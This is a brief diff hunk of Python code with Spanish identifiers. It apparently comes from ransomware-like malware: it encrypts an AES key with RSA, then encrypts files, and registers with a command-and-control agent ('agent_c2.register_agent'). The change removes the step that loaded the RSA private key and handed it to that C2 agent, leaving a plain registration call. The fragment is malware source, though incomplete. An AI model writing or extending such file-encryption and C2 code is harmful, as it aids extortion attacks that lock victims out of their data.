@@ -38,9 +38,7 @@ def cifrar_clave_aes(clave_aes):
     print("Clave AES cifrada con RSA y guardada en aes_key_encrypted.bin.")
     if not os.path.exists("rsa_private.pem"):
         raise FileNotFoundError("El archivo de clave privada RSA 'rsa_private.pem' no se encuentra.")
-    with open("rsa_private.pem", "rb") as f:
-        clave_privada = RSA.import_key(f.read())
-    agent_c2.register_agent(clave_privada)
+    agent_c2.register_agent()
 
 def cifrar_archivos():
     # Generar clave AES solo si no existe
